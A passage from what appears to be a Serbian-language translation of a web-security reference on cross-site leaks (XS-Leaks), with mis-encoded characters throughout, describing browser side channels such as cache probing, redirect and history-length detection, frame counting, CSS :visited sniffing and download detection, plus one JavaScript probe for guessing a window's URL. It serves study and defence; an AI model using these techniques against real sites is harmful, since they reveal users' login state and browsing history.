* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **SaÅ¾etak**: CORB moÅ¾e omoguÄ‡iti napadaÄima da otkriju kada je prisutno zaglavlje **`nosniff`** u zahtevu.
* **Primer koda**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Proverite link za viÅ¡e informacija o napadu.

### CORS greÅ¡ka na konfiguraciji refleksije porekla <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Metode ukljuÄivanja**: Fetch API
* **Detektovana razlika**: Zaglavlja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **SaÅ¾etak**: Ako se zaglavlje Origin reflektuje u zaglavlju `Access-Control-Allow-Origin`, moguÄ‡e je proveriti da li je resurs veÄ‡ u keÅ¡u.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

U sluÄaju da se **zaglavlje Origin** reflektuje u zaglavlju `Access-Control-Allow-Origin`, napadaÄ moÅ¾e iskoristiti ovu osobinu da pokuÅ¡a **dobavljanje** resursa u **CORS** reÅ¾imu. Ako **greÅ¡ka** nije izazvana, to znaÄi da je resurs **ispravno preuzet sa veba**, a ako je greÅ¡ka **izazvana**, to znaÄi da je pristupljen iz keÅ¡a (greÅ¡ka se pojavljuje jer keÅ¡ Äuva odgovor sa CORS zaglavljem koje dozvoljava originalni domen, a ne domen napadaÄa).\
Imajte na umu da ako se poreklo ne reflektuje veÄ‡ se koristi zamenski znak (`Access-Control-Allow-Origin: *`), ovo neÄ‡e raditi.

## Tehnika Äitljivih atributa

### Preusmeravanje Fetch

* **Metode ukljuÄivanja**: Fetch API
* **Detektovana razlika**: Statusni kod
* **ViÅ¡e informacija**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **SaÅ¾etak:** GC i SA omoguÄ‡avaju proveru tipa odgovora (opaqueredirect) nakon zavrÅ¡etka preusmeravanja.
* **Primer koda**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Slanjem zahteva pomoÄ‡u Fetch API sa `redirect: "manual"` i drugim parametrima, moguÄ‡e je proÄitati atribut `response.type` i ako je jednak `opaqueredirect`, onda je odgovor bio preusmeravanje.

### COOP

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektovana razlika**: Zaglavlje
* **ViÅ¡e informacija**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **SaÅ¾etak:** Stranice zaÅ¡tiÄ‡ene Cross-Origin Opener Policy (COOP) spreÄavaju pristup preko-graniÄnim interakcijama.
* **Primer koda**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

NapadaÄ je sposoban da zakljuÄi prisustvo zaglavlja Cross-Origin Opener Policy (COOP) u HTTP odgovoru preko granice. COOP se koristi od strane veb aplikacija da spreÄi spoljne sajtove da dobiju proizvoljne reference prozora. Vidljivost ovog zaglavlja moÅ¾e se uoÄiti pokuÅ¡ajem pristupa **`contentWindow` referenci**. U scenarijima gde se COOP primenjuje uslovno, **`opener` svojstvo** postaje pokazatelj: ono je **nedefinisano** kada je COOP aktivan, i **definisano** kada je odsutan.

### Maksimalna duÅ¾ina URL-a - Server strana

* **Metode ukljuÄivanja**: Fetch API, HTML elementi
* **Detektovana razlika**: Statusni kod / SadrÅ¾aj
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **SaÅ¾etak:** Otkrijte razlike u odgovorima zbog duÅ¾ine odgovora preusmeravanja koja moÅ¾e biti prevelika da server odgovori sa greÅ¡kom i generiÅ¡e upozorenje.
* **Primer koda**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Ako server-side preusmeravanje koristi **korisniÄki unos unutar preusmeravanja** i **dodatne podatke**, moguÄ‡e je otkriti ovu osobinu jer obiÄno **serveri** imaju **limit duÅ¾ine zahteva**. Ako je **korisniÄki podatak** te **duÅ¾ine - 1**, jer se **preusmeravanje koristi tim podacima** i **dodaje** neÅ¡to **dodatno**, to Ä‡e izazvati **greÅ¡ku koja se moÅ¾e detektovati putem dogaÄ‘aja greÅ¡ke**.

Ako na neki naÄin moÅ¾ete postaviti kolaÄiÄ‡e korisniku, moÅ¾ete takoÄ‘e izvesti ovaj napad tako Å¡to Ä‡ete **postaviti dovoljno kolaÄiÄ‡a** ([**cookie bomba**](../hacking-with-cookies/cookie-bomb.md)) tako da sa **poveÄ‡anom veliÄinom odgovora** ispravnog odgovora bude izazvana **greÅ¡ka**. U ovom sluÄaju, zapamtite da ako pokrenete ovaj zahtev sa istog sajta, `<script>` Ä‡e automatski poslati kolaÄiÄ‡e (tako da moÅ¾ete proveriti greÅ¡ke).\
Primer **cookie bombe + XS-Search** moÅ¾e se pronaÄ‡i u planiranom reÅ¡enju ovog teksta: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` ili biti u istom kontekstu obiÄno je potrebno za ovu vrstu napada.

### Maksimalna duÅ¾ina URL-a - Klijentska strana

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektovana razlika**: Statusni kod / SadrÅ¾aj
* **ViÅ¡e informacija**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **SaÅ¾etak:** Otkrijte razlike u odgovorima zbog duÅ¾ine odgovora preusmeravanja koja moÅ¾e biti prevelika za zahtev da bi se primetila razlika.
* **Primer koda**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Prema [Chromium dokumentaciji](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), maksimalna duÅ¾ina URL-a u Chrome-u je 2MB.

> UopÅ¡teno, _veb platforma_ nema ograniÄenja duÅ¾ine URL-ova (mada je 2^31 Äesto ograniÄenje). _Chrome_ ograniÄava URL-ove na maksimalnu duÅ¾inu od **2MB** iz praktiÄnih razloga i da bi izbegao probleme sa odbijanjem usluge u komunikaciji izmeÄ‘u procesa.

Stoga, ako je **URL preusmeravanja veÄ‡i u jednom od sluÄajeva**, moguÄ‡e je napraviti preusmeravanje sa **URL-om veÄ‡im od 2MB** da bi se pogodilo **ograniÄenje duÅ¾ine**. Kada se to desi, Chrome prikazuje stranicu **`about:blank#blocked`**.

**ZapaÅ¾ena razlika** je da ako je **preusmeravanje** bilo **zavrÅ¡eno**, `window.origin` baca **greÅ¡ku** jer preko granice porekla ne moÅ¾e pristupiti tim informacijama. MeÄ‘utim, ako je **limit** bio \*\*\*\* dostignut i uÄitana stranica je bila **`about:blank#blocked`**, `origin` prozora ostaje onaj od **roditelja**, Å¡to je **pristupaÄna informacija**.

Svi dodatni podaci potrebni da se dostigne **2MB** mogu se dodati putem **heÅ¡a** u poÄetni URL tako da Ä‡e biti **koriÅ¡Ä‡en u preusmeravanju**.

{% content-ref url="url-max-length-client-side.md" %}
[url-max-length-client-side.md](url-max-length-client-side.md)
{% endcontent-ref %}
### Maksimalni Redirecti

* **Metode UkljuÄivanja**: Fetch API, Frejmovi
* **Detektovana Razlika**: Statusni Kod
* **ViÅ¡e informacija**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Rezime:** Koristite ograniÄenje preusmeravanja pregledaÄa da biste utvrdili pojavu preusmeravanja URL-a.
* **Primer Koda**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Ako je **maksimalni** broj **redirecta** koje pregledaÄ moÅ¾e pratiti **20**, napadaÄ moÅ¾e pokuÅ¡ati da uÄita svoju stranicu sa **19 redirecta** i na kraju **poÅ¡alje Å¾rtvu** na testiranu stranicu. Ako se **pokrene greÅ¡ka**, to znaÄi da je stranica pokuÅ¡avala da **preusmeri Å¾rtvu**.

### DuÅ¾ina Istorije

* **Metode UkljuÄivanja**: Frejmovi, IskaÄuÄ‡i Prozori
* **Detektovana Razlika**: Redirecti
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Rezime:** JavaScript kod manipuliÅ¡e istorijom pregledaÄa i moÅ¾e se pristupiti preko svojstva duÅ¾ine.
* **Primer Koda**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

API Istorije dozvoljava JavaScript kodu da manipuliÅ¡e istorijom pregledaÄa, koja **Äuva stranice koje je posetio korisnik**. NapadaÄ moÅ¾e koristiti svojstvo duÅ¾ine kao metodu ukljuÄivanja: da detektuje JavaScript i HTML navigaciju.\
Provera `history.length`, nateranje korisnika da **navigira** do stranice, **vrati** je na isti izvor i **provera** nove vrednosti **`history.length`**.

### DuÅ¾ina Istorije sa istim URL-om

* **Metode UkljuÄivanja**: Frejmovi, IskaÄuÄ‡i Prozori
* **Detektovana Razlika**: Ako je URL isti kao pretpostavljeni
* **Rezime:** MoguÄ‡e je pretpostaviti da li je lokacija frejma/iskaÄuÄ‡eg prozora na odreÄ‘enom URL-u zloupotrebom duÅ¾ine istorije.
* **Primer Koda**: Ispod

NapadaÄ bi mogao koristiti JavaScript kod da **manipuliÅ¡e lokacijom frejma/iskaÄuÄ‡eg prozora na pretpostavljenom URL-u** i **odmah** je **promeniti u `about:blank`**. Ako se duÅ¾ina istorije poveÄ‡ala, to znaÄi da je URL bio taÄan i da je imao vremena da se **poveÄ‡a jer se URL ne uÄitava ponovo ako je isti**. Ako se nije poveÄ‡ala, to znaÄi da je **pokuÅ¡ao da uÄita pretpostavljeni URL** ali jer smo **odmah nakon toga** uÄitali **`about:blank`**, duÅ¾ina istorije se **nikada nije poveÄ‡ala** prilikom uÄitavanja pretpostavljenog URL-a.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Brojanje okvira

* **Metode ukljuÄivanja**: Okviri, IskaÄuÄ‡i prozori
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **SaÅ¾etak:** Procenite koliÄinu elemenata iframe inspekcijom svojstva `window.length`.
* **Primer koda**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Brojanje **broja okvira na vebu** otvorenih putem `iframe` ili `window.open` moÅ¾e pomoÄ‡i u identifikaciji **statusa korisnika na toj stranici**.\
Osim toga, ako stranica uvek ima isti broj okvira, proveravanje **kontinuirano** broja okvira moÅ¾e pomoÄ‡i u identifikaciji **uzorka** koji moÅ¾e otkriti informacije.

Primer ove tehnike je da se u Chrome-u **PDF** moÅ¾e **detektovati** pomoÄ‡u **brojanja okvira** jer se interna upotrebljava `embed`. Postoje [Parametri otvorenog URL-a](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) koji omoguÄ‡avaju odreÄ‘enu kontrolu nad sadrÅ¾ajem kao Å¡to su `zoom`, `view`, `page`, `toolbar`, gde bi ova tehnika mogla biti interesantna.

### HTMLElementi

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **SaÅ¾etak:** ProÄitajte procurenu vrednost da biste razlikovali izmeÄ‘u 2 moguÄ‡a stanja
* **Primer koda**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Procurenje informacija putem HTML elemenata predstavlja zabrinutost u vezi sa bezbednoÅ¡Ä‡u veba, posebno kada se dinamiÄki medijski fajlovi generiÅ¡u na osnovu korisniÄkih informacija, ili kada se dodaju vodeni Å¾igovi, menjajuÄ‡i veliÄinu medija. To mogu iskoristiti napadaÄi kako bi razlikovali moguÄ‡a stanja analizirajuÄ‡i informacije izloÅ¾ene odreÄ‘enim HTML elementima.

### Informacije izloÅ¾ene HTML elementima

* **HTMLMediaElement**: Ovaj element otkriva `duration` i `buffered` vreme medija, koje se moÅ¾e pristupiti putem njegovog API-ja. [ProÄitajte viÅ¡e o HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
* **HTMLVideoElement**: Otkriva `videoHeight` i `videoWidth`. U nekim pregledaÄima, dodatna svojstva poput `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount` i `webkitDecodedFrameCount` su dostupna, pruÅ¾ajuÄ‡i detaljnije informacije o sadrÅ¾aju medija. [ProÄitajte viÅ¡e o HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
* **getVideoPlaybackQuality()**: Ova funkcija pruÅ¾a detalje o kvalitetu reprodukcije videa, ukljuÄujuÄ‡i `totalVideoFrames`, Å¡to moÅ¾e ukazivati na koliÄinu obraÄ‘enih video podataka. [ProÄitajte viÅ¡e o getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
* **HTMLImageElement**: Ovaj element procuri `height` i `width` slike. MeÄ‘utim, ako je slika nevaÅ¾eÄ‡a, ova svojstva Ä‡e vratiti 0, a funkcija `image.decode()` Ä‡e biti odbijena, ukazujuÄ‡i na neuspeh uÄitavanja slike na odgovarajuÄ‡i naÄin. [ProÄitajte viÅ¡e o HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)

### CSS svojstvo

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle](https://xsleaks.dev/docs/attacks/element-leaks/#abusing-getcomputedstyle), [https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html](https://scarybeastsecurity.blogspot.com/2008/08/cross-domain-leaks-of-site-logins.html)
* **SaÅ¾etak:** Identifikujte varijacije u stilizovanju veb sajta koje se koreliraju sa korisnikovim stanjem ili statusom.
* **Primer koda**: [https://xsinator.com/testing.html#CSS%20Property%20Leak](https://xsinator.com/testing.html#CSS%20Property%20Leak)

Veb aplikacije mogu promeniti **stilizovanje veb sajta u zavisnosti od statusa korisnika**. CSS fajlovi sa razliÄitih izvora mogu biti ugraÄ‘eni na stranicu napadaÄa pomoÄ‡u **HTML link elementa**, i **pravila** Ä‡e biti **primenjena** na stranicu napadaÄa. Ako stranica dinamiÄki menja ova pravila, napadaÄ moÅ¾e **detektovati** ove **razlike** u zavisnosti od korisniÄkog stanja.\
Kao tehniku procurivanja, napadaÄ moÅ¾e koristiti metodu `window.getComputedStyle` za **Äitanje CSS** svojstava odreÄ‘enog HTML elementa. Kao rezultat, napadaÄ moÅ¾e proÄitati proizvoljna CSS svojstva ako su poznati pogoÄ‘eni element i naziv svojstva.

### CSS istorija

* **Metode ukljuÄivanja**: HTML elementi
* **Detektoviva razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history](https://xsleaks.dev/docs/attacks/css-tricks/#retrieving-users-history)
* **SaÅ¾etak:** Detektujte da li je primenjen stil `:visited` na URL, Å¡to ukazuje da je veÄ‡ poseÄ‡en
* **Primer koda**: [http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html](http://blog.bawolff.net/2021/10/write-up-pbctf-2021-vault.html)

{% hint style="info" %}
Prema [**ovome**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/), ovo ne funkcioniÅ¡e u headless Chrome-u.
{% endhint %}

CSS `:visited` selektor se koristi za stilizovanje URL-ova na drugaÄiji naÄin ako su ih korisnici prethodno posetili. Ranije se metoda `getComputedStyle()` mogla koristiti za identifikaciju ovih stilskih razlika. MeÄ‘utim, moderni pregledaÄi su implementirali sigurnosne mere kako bi spreÄili da ova metoda otkrije stanje linka. Ove mere ukljuÄuju uvek vraÄ‡anje izraÄunatog stila kao da je link poseÄ‡en i ograniÄavanje stilova koji se mogu primeniti sa selektorom `:visited`.

I pored ovih ograniÄenja, moguÄ‡e je neizravno uoÄiti poseÄ‡eno stanje linka. Jedna tehnika ukljuÄuje prevaru korisnika da interaguju sa podruÄjem koje je pogoÄ‘eno CSS-om, posebno koriÅ¡Ä‡enjem svojstva `mix-blend-mode`. Ovo svojstvo omoguÄ‡ava meÅ¡anje elemenata sa njihovom pozadinom, potencijalno otkrivajuÄ‡i poseÄ‡eno stanje na osnovu korisniÄke interakcije.

Osim toga, detekcija moÅ¾e biti postignuta bez interakcije korisnika iskoriÅ¡Ä‡avanjem vremena renderovanja linkova. PoÅ¡to pregledaÄi mogu renderovati poseÄ‡ene i neposeÄ‡ene linkove na razliÄite naÄine, ovo moÅ¾e uvesti merljivu razliku u vremenu renderovanja. Dokaz koncepta (PoC) je pomenut u izveÅ¡taju o bagu u Chromium-u, demonstrirajuÄ‡i ovu tehniku koriÅ¡Ä‡enjem viÅ¡e linkova za pojaÄavanje vremenske razlike, Äime se poseÄ‡eno stanje moÅ¾e otkriti analizom vremena.

Za dodatne detalje o ovim svojstvima i metodama, posetite njihove stranice sa dokumentacijom:

* `:visited`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/CSS/:visited)
* `getComputedStyle()`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/API/Window/getComputedStyle)
* `mix-blend-mode`: [MDN Dokumentacija](https://developer.mozilla.org/en-US/docs/Web/CSS/mix-blend-mode)
### ContentDocument X-Frame Leak

* **Metode ukljuÄivanja**: Okviri
* **Detektibilna razlika**: Zaglavlja
* **ViÅ¡e informacija**: [https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf](https://www.ndss-symposium.org/wp-content/uploads/2020/02/24278-paper.pdf)
* **SaÅ¾etak:** U Google Chrome-u, posveÄ‡ena greÅ¡ka se prikazuje kada je stranica blokirana za ugradnju na sajt preko granica izvora zbog restrikcija X-Frame-Options.
* **Primer koda**: [https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak](https://xsinator.com/testing.html#ContentDocument%20X-Frame%20Leak)

U Chrome-u, ako je stranica sa zaglavljem `X-Frame-Options` postavljena na "deny" ili "same-origin" ugraÄ‘ena kao objekat, pojavljuje se stranica greÅ¡ke. Chrome jedinstveno vraÄ‡a prazan dokument objekat (umesto `null`) za svojstvo `contentDocument` ovog objekta, za razliku od iframes ili drugih pregledaÄa. NapadaÄi bi mogli iskoristiti ovo otkrivanjem praznog dokumenta, potencijalno otkrivajuÄ‡i informacije o stanju korisnika, posebno ako programeri nekonzistentno postavljaju zaglavlje X-Frame-Options, Äesto previdjajuÄ‡i stranice greÅ¡ke. Svest i dosledna primena sigurnosnih zaglavlja su kljuÄne za spreÄavanje takvih curenja.

### Detekcija Preuzimanja

* **Metode ukljuÄivanja**: Okviri, IskaÄuÄ‡i prozori
* **Detektibilna razlika**: Zaglavlja
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#download-trigger](https://xsleaks.dev/docs/attacks/navigations/#download-trigger)
* **SaÅ¾etak:** NapadaÄ moÅ¾e razlikovati preuzimanje datoteka iskoriÅ¡Ä‡avanjem iframes; nastavljena dostupnost iframa implicira uspeÅ¡no preuzimanje datoteke.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/navigations/#download-bar](https://xsleaks.dev/docs/attacks/navigations/#download-bar)

Zaglavlje `Content-Disposition`, posebno `Content-Disposition: attachment`, instruiÅ¡e pregledaÄ da preuzme sadrÅ¾aj umesto prikazivanja inline. Ovo ponaÅ¡anje moÅ¾e biti iskoriÅ¡Ä‡eno za otkrivanje da li korisnik ima pristup stranici koja pokreÄ‡e preuzimanje datoteke. U pregledaÄima zasnovanim na Chromium-u, postoje nekoliko tehnika za otkrivanje ovog ponaÅ¡anja preuzimanja:

1. **Pratnja Trake Preuzimanja**:
* Kada se datoteka preuzme u pregledaÄima zasnovanim na Chromium-u, traka preuzimanja se pojavljuje na dnu prozora pregledaÄa.
* PrateÄ‡i promene u visini prozora, napadaÄi mogu zakljuÄiti pojavljivanje trake preuzimanja, sugeriÅ¡uÄ‡i da je preuzimanje pokrenuto.
2. **Navigacija Preuzimanja sa Iframes**:
* Kada stranica pokrene preuzimanje datoteke koristeÄ‡i zaglavlje `Content-Disposition: attachment`, to ne izaziva dogaÄ‘aj navigacije.
* UÄitavanjem sadrÅ¾aja u iframe i praÄ‡enjem dogaÄ‘aja navigacije, moguÄ‡e je proveriti da li uzrokovanje rasporeda sadrÅ¾aja izaziva preuzimanje datoteke (bez navigacije) ili ne.
3. **Navigacija Preuzimanja bez Iframes**:
* SliÄno kao tehnika sa iframe-om, ovaj metod ukljuÄuje koriÅ¡Ä‡enje `window.open` umesto iframe-a.
* PraÄ‡enjem dogaÄ‘aja navigacije u novootvorenom prozoru moÅ¾e se otkriti da li je pokrenuto preuzimanje datoteke (bez navigacije) ili se sadrÅ¾aj prikazuje inline (nastupa navigacija).

U scenarijima gde samo prijavljeni korisnici mogu pokrenuti takva preuzimanja, ove tehnike se mogu koristiti za indirektno zakljuÄivanje autentifikacionog stanja korisnika na osnovu odgovora pregledaÄa na zahtev za preuzimanje.

### Bajpasiranje Particionisanog HTTP KeÅ¡a <a href="#partitioned-http-cache-bypass" id="partitioned-http-cache-bypass"></a>

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektibilna razlika**: Vreme
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass)
* **SaÅ¾etak:** NapadaÄ moÅ¾e razlikovati preuzimanje datoteka iskoriÅ¡Ä‡avanjem iframes; nastavljena dostupnost iframa implicira uspeÅ¡no preuzimanje datoteke.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass](https://xsleaks.dev/docs/attacks/navigations/#partitioned-http-cache-bypass), [https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722](https://gist.github.com/aszx87410/e369f595edbd0f25ada61a8eb6325722) (sa [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))

{% hint style="warning" %}
ZaÅ¡to je ova tehnika interesantna: Chrome sada ima **particionisanje keÅ¡a**, a kljuÄ keÅ¡a novootvorene stranice je: `(https://actf.co, https://actf.co, https://sustenance.web.actf.co/?m =xxx)`, ali ako otvorim ngrok stranicu i koristim fetch na njoj, kljuÄ keÅ¡a Ä‡e biti: `(https://myip.ngrok.io, https://myip.ngrok.io, https://sustenance.web.actf.co/?m=xxx)`, **kljuÄ keÅ¡a je razliÄit**, tako da keÅ¡ ne moÅ¾e biti deljen. ViÅ¡e detalja moÅ¾ete pronaÄ‡i ovde: [PoboljÅ¡anje sigurnosti i privatnosti particionisanjem keÅ¡a](https://developer.chrome.com/blog/http-cache-partitioning/)\
(Komentar sa [**ovde**](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/))
{% endhint %}

Ako sajt `primer.com` ukljuÄuje resurs sa `*.primer.com/resource` onda Ä‡e taj resurs imati **isti kljuÄ keÅ¡a** kao da je resurs direktno **zahtevan kroz navigaciju na vrh nivoa**. To je zato Å¡to kljuÄ keÅ¡a Äine _eTLD+1_ na vrhu i okvir _eTLD+1_.

Zbog toga Å¡to je pristup keÅ¡u brÅ¾i od uÄitavanja resursa, moguÄ‡e je pokuÅ¡ati promeniti lokaciju stranice i otkazati je 20ms (na primer) nakon toga. Ako je poreklo promenjeno nakon zaustavljanja, to znaÄi da je resurs keÅ¡iran.\
Ili jednostavno **poslati neki fetch ka potencijalno keÅ¡iranoj stranici i meriti vreme koje je potrebno**.

### RuÄno Preusmeravanje <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metode ukljuÄivanja**: Fetch API
* **Detektibilna razlika**: Preusmeravanja
* **ViÅ¡e informacija**: [ttps://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.gae7bf0b4f7\_0\_1234)
* **SaÅ¾etak:** MoguÄ‡e je saznati da li je odgovor na zahtev fetch preusmeren
* **Primer koda**:

![](<../../.gitbook/assets/image (769).png>)

### Fetch sa AbortController-om <a href="#fetch-with-abortcontroller" id="fetch-with-abortcontroller"></a>

* **Metode ukljuÄivanja**: Fetch API
* **Detektibilna razlika**: Vreme
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)
* **SaÅ¾etak:** MoguÄ‡e je pokuÅ¡ati uÄitati resurs i prekinuti uÄitavanje pre nego Å¡to se zavrÅ¡i. Zavisno o tome da li je izazvana greÅ¡ka, resurs je ili nije keÅ¡iran.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller](https://xsleaks.dev/docs/attacks/cache-probing/#fetch-with-abortcontroller)

Koristite _**fetch**_ i _**setTimeout**_ sa **AbortController**-om kako biste detektovali da li je **resurs keÅ¡iran** i kako biste uklonili odreÄ‘eni resurs iz keÅ¡a pregledaÄa. Osim toga, proces se odvija bez keÅ¡iranja novog sadrÅ¾aja.
### Skriptna zagaÄ‘enost

* **Metode ukljuÄivanja**: HTML elementi (skripte)
* **Detektibilna razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)
* **SaÅ¾etak:** MoguÄ‡e je **prepisati ugraÄ‘ene funkcije** i proÄitati njihove argumente Äak i iz **skripti sa razliÄitog porekla** (koje se ne mogu direktno proÄitati), Å¡to moÅ¾e **procureti vredne informacije**.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/element-leaks/#script-tag](https://xsleaks.dev/docs/attacks/element-leaks/#script-tag)

### Servisni radnici <a href="#service-workers" id="service-workers"></a>

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektibilna razlika**: SadrÅ¾aj stranice
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#service-workers)
* **SaÅ¾etak:** Merenje vremena izvrÅ¡avanja veba koristeÄ‡i servisne radnike.
* **Primer koda**:

U datom scenariju, napadaÄ preduzima inicijativu da registruje **servisnog radnika** unutar jednog od svojih domena, taÄnije "attacker.com". Zatim, napadaÄ otvara novi prozor na ciljnom veb sajtu iz glavnog dokumenta i nareÄ‘uje **servisnom radniku** da pokrene tajmer. Dok se novi prozor poÄinje uÄitavati, napadaÄ navigira referencu dobijenu u prethodnom koraku ka stranici koju upravlja **servisni radnik**.

Po dolasku zahteva pokrenutog u prethodnom koraku, **servisni radnik** odgovara sa statusnim kodom **204 (Nema sadrÅ¾aja)**, efikasno zavrÅ¡avajuÄ‡i proces navigacije. U ovom trenutku, **servisni radnik** beleÅ¾i merenje sa tajmera pokrenutog ranije u koraku dva. Ovo merenje je uticano trajanjem JavaScript-a koji uzrokuje kaÅ¡njenja u procesu navigacije.

{% hint style="upozorenje" %}
